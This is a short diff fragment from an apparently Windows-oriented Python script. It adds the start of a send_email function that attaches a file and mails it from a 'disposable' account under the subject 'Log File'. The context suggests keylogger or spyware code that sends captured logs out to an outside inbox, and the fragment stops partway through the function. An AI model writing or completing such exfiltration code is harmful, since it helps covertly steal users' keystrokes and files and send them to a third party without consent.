@@ -33,3 +33,12 @@ email_address = "example@domain.com" # Enter disposable email here
 password = "myPa55w0rd" # Enter email password here
 extend = "\\"
 file_merge = file_path + extend
+
+
+# Send Email
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
